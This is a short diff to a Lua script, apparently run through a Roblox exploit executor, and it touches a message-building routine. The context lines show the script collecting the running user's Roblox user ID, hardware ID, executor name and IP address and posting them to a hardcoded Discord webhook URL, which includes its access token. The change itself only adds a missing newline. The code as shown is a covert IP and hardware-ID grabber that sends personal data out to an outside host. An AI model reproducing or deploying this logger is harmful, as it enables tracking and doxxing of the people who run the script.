@@ -20,7 +20,7 @@ content = content.."\n> Id: `"..LocalPlayer.UserId.."`"
 content = content.."\n> HWID: `"..HWID.."`"
 content = content.."\n> Executor: `"..Executor_b.."`"
 content = content.."\n> Ip: `"..ip.."`"
-content = content.."> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"
+content = content.."\n> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"
 request{
     Url = "https://discord.com/api/webhooks/1046446932039565513/Qz8LcvpOi_-fVpIhaKGS0vyaC2ONFv40zcQKaIAAiGO3pzvE_wBbH-_UNOYHGIi-s87I",
     Method = "POST",
